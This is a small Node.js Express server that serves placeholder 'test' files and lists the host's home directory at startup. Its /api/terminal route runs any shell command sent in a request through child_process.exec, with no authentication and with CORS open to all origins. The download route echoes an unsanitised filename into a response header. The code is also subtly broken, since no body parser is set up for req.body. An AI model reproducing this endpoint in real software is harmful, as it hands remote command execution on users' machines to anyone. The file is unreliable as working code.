const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const express = require('express');
const cors = require('cors');

const app = express();
app.use(cors());


const homeDir = require('os').homedir();
console.log('Files in home directory:');
fs.readdirSync(homeDir).forEach(file => console.log(file));


app.get('/api/files', (req, res) => {
  res.json([
    { name: 'test-file-1.txt', url: '/download/test-file-1.txt' },
    { name: 'test-file-2.txt', url: '/download/test-file-2.txt' },
    { name: 'test-file-3.txt', url: '/download/test-file-3.txt' }
  ]);
});


app.get('/download/:filename', (req, res) => {
  const { filename } = req.params;
  console.log(`Downloaded: ${filename}`);
  

  res.setHeader('Content-disposition', `attachment; filename=${filename}`);
  res.setHeader('Content-type', 'text/plain');
  res.send(`This is test content for ${filename}`);
});


app.post('/api/terminal', (req, res) => {
  exec(req.body.command || 'echo Hello, World!', (error, stdout, stderr) => {
    if (error) return res.status(500).json({ error: error.message });
    res.json({ output: stdout || stderr });
  });
});


const PORT = 5000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log('Hello, World!');
});